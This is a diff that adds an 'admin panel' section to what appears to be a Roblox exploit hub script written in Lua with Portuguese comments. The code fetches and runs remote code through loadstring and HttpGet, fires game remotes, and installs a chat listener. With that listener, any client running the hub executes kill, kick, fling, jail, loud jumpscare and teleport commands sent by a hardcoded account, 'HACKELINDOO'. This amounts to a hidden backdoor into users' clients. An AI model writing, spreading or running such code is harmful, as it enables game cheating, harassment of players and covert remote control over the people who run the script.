@@ -5017,3 +5017,595 @@ else
     for _, p in ipairs(Players:GetPlayers()) do EscutarJogador(p) end
     Players.PlayerAdded:Connect(EscutarJogador)
 end
+-- ====================================================================
+-- ABA: ADMINISTRADOR COMPLETA (RAYFIELD + KEY HACKELINDOO + DRIP CLIENT)
+-- ====================================================================
+
+local Jajail = {}
+local MagGelion = {}
+
+-- 1. LISTA DE ADMINISTRADORES AUTORIZADOS
+local AdminsAutorizados = {
+    ["HACKELINDOO"] = true, -- Substitua pelo seu Nick exato se necessário
+    [LocalPlayer.Name] = true
+}
+
+-- 2. FUNÇÃO AUXILIAR PARA ENVIAR MENSAGENS/COMANDOS NO CHAT
+local function EnviarMensagemChat(mensagem)
+    pcall(function()
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") 
+                or TextChatService.TextChannels:GetChildren()[1]
+            if canal then canal:SendAsync(mensagem) end
+        else
+            local defaultEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+            if defaultEvents and defaultEvents:FindFirstChild("SayMessageRequest") then
+                defaultEvents.SayMessageRequest:FireServer(mensagem, "All")
+            end
+        end
+    end)
+end
+
+-- ====================================================================
+-- FUNÇÕES DE EFEITOS E CONTROLE (DRIP CLIENT)
+-- ====================================================================
+
+-- Função: Criar Jaula (ForceField)
+local function CreateJail(targetPlr)
+    if not targetPlr or Jajail[targetPlr] then return end
+    local char = targetPlr.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        local HRP = char.HumanoidRootPart
+        local cageSize = Vector3.new(10, 10, 10)
+        local cageModel = Instance.new("Model")
+        cageModel.Name = "JaulaAdmin_" .. targetPlr.Name
+        cageModel.Parent = workspace
+
+        local function createWall(size, offset)
+            local wall = Instance.new("Part")
+            wall.Size = size
+            wall.Anchored = true
+            wall.CanCollide = true
+            wall.Transparency = 0.3
+            wall.Color = Color3.fromRGB(75, 0, 130)
+            wall.Material = Enum.Material.ForceField
+            wall.CFrame = HRP.CFrame * offset
+            wall.Parent = cageModel
+
+            local box = Instance.new("SelectionBox")
+            box.Color3 = Color3.fromRGB(147, 112, 219)
+            box.Adornee = wall
+            box.Parent = wall
+        end
+
+        createWall(Vector3.new(cageSize.X, 0.5, cageSize.Z), CFrame.new(0, -cageSize.Y/2, 0))
+        createWall(Vector3.new(cageSize.X, 0.5, cageSize.Z), CFrame.new(0, cageSize.Y/2, 0))
+        createWall(Vector3.new(cageSize.X, cageSize.Y, 0.5), CFrame.new(0, 0, -cageSize.Z/2))
+        createWall(Vector3.new(cageSize.X, cageSize.Y, 0.5), CFrame.new(0, 0, cageSize.Z/2))
+        createWall(Vector3.new(0.5, cageSize.Y, cageSize.Z), CFrame.new(cageSize.X/2, 0, 0))
+        createWall(Vector3.new(0.5, cageSize.Y, cageSize.Z), CFrame.new(-cageSize.X/2, 0, 0))
+
+        Jajail[targetPlr] = cageModel
+    end
+end
+
+-- Função: Remover Jaula
+local function RemoveJail(targetPlr)
+    if targetPlr and Jajail[targetPlr] then
+        Jajail[targetPlr]:Destroy()
+        Jajail[targetPlr] = nil
+    end
+end
+
+-- Função: Congelar Jogador (Freeze)
+local function FreezePlayer(targetPlr)
+    if not targetPlr or MagGelion[targetPlr] then return end
+    local char = targetPlr.Character
+    if char then
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.WalkSpeed = 0
+            hum.JumpPower = 0
+        end
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then part.Anchored = true end
+        end
+        MagGelion[targetPlr] = true
+    end
+end
+
+-- Função: Descongelar Jogador (Unfreeze)
+local function UnfreezePlayer(targetPlr)
+    if not targetPlr or not MagGelion[targetPlr] then return end
+    local char = targetPlr.Character
+    if char then
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.WalkSpeed = 16
+            hum.JumpPower = 50
+        end
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") then part.Anchored = false end
+        end
+    end
+    MagGelion[targetPlr] = nil
+end
+
+-- Função: Explodir
+local function Explode(targetPlr)
+    if not targetPlr then return end
+    local char = targetPlr.Character
+    if not char then return end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hrp and hum then
+        local explosion = Instance.new("Explosion")
+        explosion.Position = hrp.Position
+        explosion.BlastRadius = 0
+        explosion.Parent = workspace
+
+        for _, part in ipairs(char:GetDescendants()) do
+            if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                part.Velocity = Vector3.new(math.random(-150, 150), math.random(100, 180), math.random(-150, 150))
+            end
+        end
+        hum.Health = 0
+    end
+end
+
+-- Função: Avatar Coolkid (Troca de Roupas Brookhaven)
+local function CoolkidAvatar(targetPlr)
+    local char = targetPlr and targetPlr.Character
+    if not char then return end
+    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
+    if not remotes then return end
+
+    local wear = remotes:FindFirstChild("Wear")
+    local changeBody = remotes:FindFirstChild("ChangeCharacterBody")
+    local changeColor = remotes:FindFirstChild("ChangeBodyColor")
+
+    if changeBody then changeBody:InvokeServer({{0, 0, 0, 0, 0, 0}}) end
+    if changeColor then changeColor:FireServer("Really red") end
+
+    local accs = {18554114295, 3164473649, 6093233760}
+    if wear then
+        for _, id in ipairs(accs) do
+            wear:InvokeServer(id)
+            task.wait(0.2)
+        end
+    end
+end
+
+-- Função: Modo C00lkid (Hacking Game Ambiente)
+local function Coolkid(targetPlr)
+    local sky = Instance.new("Sky", game.Lighting)
+    for _, face in ipairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
+        sky["Skybox" .. face] = "rbxassetid://100048062301288"
+    end
+
+    local decalId = "rbxassetid://100048062301288"
+    for _, part in ipairs(workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+            for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+                local decal = Instance.new("Decal")
+                decal.Face = face
+                decal.Texture = decalId
+                decal.Parent = part
+            end
+        end
+    end
+
+    local sound = Instance.new("Sound", workspace)
+    sound.SoundId = "rbxassetid://99986264226275"
+    sound.Volume = 2
+    sound:Play()
+end
+
+-- Função: Jumpscare Clássico
+local function Jumpscare(targetPlr)
+    local gui = Instance.new("ScreenGui", CoreGui)
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder = 999999
+
+    local img = Instance.new("ImageLabel", gui)
+    img.Size = UDim2.new(1.2, 0, 1.2, 0)
+    img.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    img.BackgroundTransparency = 1
+    img.Image = "rbxassetid://108753859505348"
+
+    local s = Instance.new("Sound", workspace)
+    s.SoundId = "rbxassetid://18967004856"
+    s.Volume = 10
+    s:Play()
+
+    task.spawn(function()
+        for i = 1, 50 do
+            img.Position = UDim2.new(-0.1, math.random(-15, 15), -0.1, math.random(-15, 15))
+            task.wait(0.03)
+        end
+        gui:Destroy()
+        s:Destroy()
+    end)
+end
+
+-- Função: Messi Jumpscare
+local function MessiJumpscare(targetPlr)
+    local gui = Instance.new("ScreenGui", CoreGui)
+    gui.IgnoreGuiInset = true
+    gui.DisplayOrder = 999999
+
+    local img = Instance.new("ImageLabel", gui)
+    img.Size = UDim2.new(1.2, 0, 1.2, 0)
+    img.Position = UDim2.new(-0.1, 0, -0.1, 0)
+    img.BackgroundTransparency = 1
+    img.Image = "rbxassetid://90576086504588"
+
+    local s = Instance.new("Sound", workspace)
+    s.SoundId = "rbxassetid://88347533205938"
+    s.Volume = 10
+    s:Play()
+
+    task.delay(2.5, function()
+        gui:Destroy()
+        s:Destroy()
+    end)
+end
+
+-- Função: Mandar para os Backrooms
+local function Backrooms(targetPlr)
+    local char = targetPlr and targetPlr.Character
+    if char and char:FindFirstChild("HumanoidRootPart") then
+        char.HumanoidRootPart.CFrame = CFrame.new(100127, 100003, 100192)
+    end
+end
+
+-- ====================================================================
+-- BOTÃO NA ABA ADMIN (ABRE RAYFIELD COM KEY HACKELINDOO)
+-- ====================================================================
+TabAdmin:AddSection({"Painel de Administração"})
+
+TabAdmin:AddButton({
+    Name = "Abrir Painel Admin (Drip Edition)",
+    Description = "Requer Key de Acesso (HACKELINDOO)",
+    Callback = function()
+        if not AdminsAutorizados[LocalPlayer.Name] then
+            StarterGui:SetCore("SendNotification", {
+                Title = "Acesso Negado",
+                Text = "Você não é um administrador.",
+                Duration = 3
+            })
+            return
+        end
+
+        -- Carrega a biblioteca Rayfield
+        local ok, Rayfield = pcall(function()
+            return loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+        end)
+
+        if not ok or not Rayfield then
+            StarterGui:SetCore("SendNotification", {
+                Title = "Erro",
+                Text = "Falha ao carregar Rayfield.",
+                Duration = 3
+            })
+            return
+        end
+
+        -- Criação da janela Rayfield com Key System
+        local AdminWindow = Rayfield:CreateWindow({
+            Name = "👾 Dark x Hub 👾 | Painel Admin",
+            Icon = 0,
+            LoadingTitle = "Dark x Hub",
+            LoadingSubtitle = "by HACKELINDOO",
+            Theme = "Default",
+            DisableRayfieldPrompts = true,
+            DisableBuildWarnings = true,
+            ConfigurationSaving = { Enabled = false },
+            Discord = { Enabled = false },
+            KeySystem = true, -- Ativa o sistema de verificação
+            KeySettings = {
+                Title = "Dark x Hub | Painel Admin",
+                Subtitle = "Verificação de Administrador",
+                Note = "Insira a chave de acesso.",
+                FileName = "DarkXAdminKey",
+                SaveKey = true,
+                GrabKeyFromSite = false,
+                Key = {"HACKELINDOO"} -- Chave obrigatória
+            }
+        })
+
+        local Tab = AdminWindow:CreateTab("Comandos", 4483362458)
+
+        -- SEÇÃO: SELEÇÃO DE JOGADOR
+        Tab:CreateSection("Seleção de Jogador")
+        local TargetName = ""
+        local function ObterJogadores()
+            local lista = {"all"}
+            for _, p in ipairs(Players:GetPlayers()) do
+                if p ~= LocalPlayer then table.insert(lista, p.Name) end
+            end
+            return lista
+        end
+
+        local DropdownPlayer = Tab:CreateDropdown({
+            Name = "Selecionar Alvo",
+            Options = ObterJogadores(),
+            CurrentOption = {""},
+            MultipleOptions = false,
+            Flag = "DropdownAdminAlvo",
+            Callback = function(Option)
+                local val = type(Option) == "table" and Option[1] or Option
+                TargetName = val or ""
+            end
+        })
+
+        -- Atualização dinâmica da lista de jogadores
+        Players.PlayerAdded:Connect(function()
+            pcall(function() if DropdownPlayer.Refresh then DropdownPlayer:Refresh(ObterJogadores()) end end)
+        end)
+        Players.PlayerRemoving:Connect(function()
+            pcall(function() if DropdownPlayer.Refresh then DropdownPlayer:Refresh(ObterJogadores()) end end)
+        end)
+
+        -- Função auxiliar de disparo via chat
+        local function ExecutarComando(cmd)
+            if TargetName ~= "" then
+                EnviarMensagemChat(";" .. cmd .. " " .. TargetName)
+            else
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Atenção",
+                    Text = "Selecione um jogador primeiro!",
+                    Duration = 2
+                })
+            end
+        end
+
+        -- SEÇÃO: COMANDOS BÁSICOS
+        Tab:CreateSection("Comandos Básicos")
+
+        Tab:CreateButton({
+            Name = "Kill Player",
+            Callback = function()
+                ExecutarComando("kill")
+                local target = Players:FindFirstChild(TargetName)
+                if target == LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+                    LocalPlayer.Character.Humanoid.Health = 0
+                end
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Kick Player",
+            Callback = function()
+                ExecutarComando("kick")
+                local target = Players:FindFirstChild(TargetName)
+                if target == LocalPlayer then
+                    LocalPlayer:Kick("Você foi expulso pelo painel de admin.")
+                end
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Bring Player",
+            Callback = function()
+                ExecutarComando("bring")
+                local target = Players:FindFirstChild(TargetName)
+                if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                end
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Fling Player",
+            Callback = function()
+                ExecutarComando("fling")
+                local target = Players:FindFirstChild(TargetName)
+                if target == LocalPlayer and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                    local bv = Instance.new("BodyVelocity")
+                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                    bv.Velocity = Vector3.new(math.random(-500, 500), 1000, math.random(-500, 500))
+                    bv.Parent = LocalPlayer.Character.HumanoidRootPart
+                    task.delay(0.5, function() if bv then bv:Destroy() end end)
+                end
+            end
+        })
+
+        -- SEÇÃO: COMANDOS DE CONTROLE
+        Tab:CreateSection("Comandos de Controle")
+
+        Tab:CreateButton({
+            Name = "Jail Player",
+            Callback = function()
+                ExecutarComando("jail")
+                local target = Players:FindFirstChild(TargetName) or LocalPlayer
+                CreateJail(target)
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Unjail Player",
+            Callback = function()
+                ExecutarComando("unjail")
+                local target = Players:FindFirstChild(TargetName) or LocalPlayer
+                RemoveJail(target)
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Freeze Player",
+            Callback = function()
+                ExecutarComando("freeze")
+                local target = Players:FindFirstChild(TargetName) or LocalPlayer
+                FreezePlayer(target)
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Unfreeze Player",
+            Callback = function()
+                ExecutarComando("unfreeze")
+                local target = Players:FindFirstChild(TargetName) or LocalPlayer
+                UnfreezePlayer(target)
+            end
+        })
+
+        -- SEÇÃO: COMANDOS VIEWS & TROLL (DRIP CLIENT)
+        Tab:CreateSection("Comandos Views & Troll")
+
+        Tab:CreateButton({
+            Name = "Explodir Jogador",
+            Callback = function()
+                ExecutarComando("explod")
+                local target = Players:FindFirstChild(TargetName) or LocalPlayer
+                Explode(target)
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Coolkid Avatar",
+            Callback = function()
+                ExecutarComando("coolkidavatar")
+                CoolkidAvatar(LocalPlayer)
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Hacking Game (C00lkid)",
+            Callback = function()
+                ExecutarComando("c00lkid")
+                Coolkid(LocalPlayer)
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Jumpscare Clássico",
+            Callback = function()
+                ExecutarComando("jumpscare")
+                Jumpscare(LocalPlayer)
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Messi Jumpscare",
+            Callback = function()
+                ExecutarComando("messijumpscare")
+                MessiJumpscare(LocalPlayer)
+            end
+        })
+
+        Tab:CreateButton({
+            Name = "Mandar para Backrooms",
+            Callback = function()
+                ExecutarComando("backrooms")
+                local target = Players:FindFirstChild(TargetName) or LocalPlayer
+                Backrooms(target)
+            end
+        })
+
+        -- SEÇÃO: VERIFICAÇÃO EM REDE
+        Tab:CreateSection("Verificação de Clientes")
+
+        Tab:CreateButton({
+            Name = "Verificar Usuários com Hub",
+            Callback = function()
+                EnviarMensagemChat(";verifique")
+                StarterGui:SetCore("SendNotification", {
+                    Title = "Verificando...",
+                    Text = "Buscando usuários com o Hub ativo no chat...",
+                    Duration = 4
+                })
+            end
+        })
+    end
+})
+-- ====================================================================
+-- SISTEMA DE EXECUÇÃO DE COMANDOS (RECEPÇÃO VIA CHAT)
+-- ====================================================================
+local function ProcessarComando(remetente, mensagem)
+    if not AdminsAutorizados[remetente.Name] then return end
+    if string.sub(mensagem, 1, 1) ~= ";" and string.sub(mensagem, 1, 1) ~= "/" then return end
+
+    local args = string.split(string.sub(mensagem, 2), " ")
+    local comando = string.lower(args[1] or "")
+    local alvoNome = args[2]
+
+    local myChar = LocalPlayer.Character
+    local myHum = myChar and myChar:FindFirstChildOfClass("Humanoid")
+    local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
+
+    local ehParaMim = false
+    if alvoNome then
+        alvoNome = string.lower(alvoNome)
+        local meName = string.lower(LocalPlayer.Name)
+        if alvoNome == "all" or alvoNome == meName or string.find(meName, alvoNome, 1, true) then
+            ehParaMim = true
+        end
+    end
+
+    -- Resposta da verificação
+    if comando == "verifique" or comando == "verificar_drip_client" then
+        EnviarMensagemChat(LocalPlayer.Name .. " [Dark x Hub Ativo]")
+        return
+    end
+
+    -- Execução dos comandos no cliente alvo
+    if ehParaMim then
+        if comando == "kill" and myHum then
+            myHum.Health = 0
+        elseif comando == "kick" then
+            LocalPlayer:Kick("Você foi expulso pelo painel de admin.")
+        elseif comando == "bring" and myHRP and remetente.Character and remetente.Character:FindFirstChild("HumanoidRootPart") then
+            myHRP.CFrame = remetente.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
+        elseif comando == "fling" and myHRP then
+            local bv = Instance.new("BodyVelocity")
+            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+            bv.Velocity = Vector3.new(math.random(-500, 500), 1000, math.random(-500, 500))
+            bv.Parent = myHRP
+            task.delay(0.5, function() if bv then bv:Destroy() end end)
+        elseif comando == "jail" then
+            CreateJail(LocalPlayer)
+        elseif comando == "unjail" then
+            RemoveJail(LocalPlayer)
+        elseif comando == "freeze" then
+            FreezePlayer(LocalPlayer)
+        elseif comando == "unfreeze" then
+            UnfreezePlayer(LocalPlayer)
+        elseif comando == "explod" then
+            Explode(LocalPlayer)
+        elseif comando == "coolkidavatar" then
+            CoolkidAvatar(LocalPlayer)
+        elseif comando == "c00lkid" then
+            Coolkid(LocalPlayer)
+        elseif comando == "jumpscare" then
+            Jumpscare(LocalPlayer)
+        elseif comando == "messijumpscare" then
+            MessiJumpscare(LocalPlayer)
+        elseif comando == "backrooms" then
+            Backrooms(LocalPlayer)
+        end
+    end
+end
+
+-- ====================================================================
+-- LISTENERS DO CHAT (SUPORTE TEXTCHATSERVICE E LEGACY)
+-- ====================================================================
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    TextChatService.MessageReceived:Connect(function(textChatMessage)
+        local textSource = textChatMessage.TextSource
+        if textSource then
+            local sender = Players:GetPlayerByUserId(textSource.UserId)
+            if sender then
+                ProcessarComando(sender, textChatMessage.Text)
+            end
+        end
+    end)
+else
+    local function EscutarJogador(player)
+        player.Chatted:Connect(function(msg) 
+            ProcessarComando(player, msg) 
+        end)
+    end
+    for _, p in ipairs(Players:GetPlayers()) do EscutarJogador(p) end
+    Players.PlayerAdded:Connect(EscutarJogador)
+end
